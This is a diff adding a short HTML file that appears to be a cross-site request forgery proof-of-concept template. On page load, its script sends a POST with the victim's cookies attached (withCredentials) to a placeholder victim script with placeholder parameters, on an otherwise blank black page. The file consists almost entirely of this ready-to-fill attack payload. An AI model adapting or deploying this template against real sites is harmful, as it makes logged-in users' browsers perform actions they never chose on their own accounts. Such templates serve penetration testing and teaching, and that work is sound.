@@ -1,0 +1,15 @@
+<html>
+
+    <body bgcolor="#000000">
+    </body>
+            <script type="text/javascript">
+                   var url =  "http://URL/VICTIM_SCRIPT.php";
+                   var params =  "param1=test1&param2=test2";
+                   var CSRF = new XMLHttpRequest();
+                   CSRF.open("POST", url, true);
+                   CSRF.withCredentials = 'true';
+                   CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                   CSRF.send(params);
+            </script>
+
+</html>
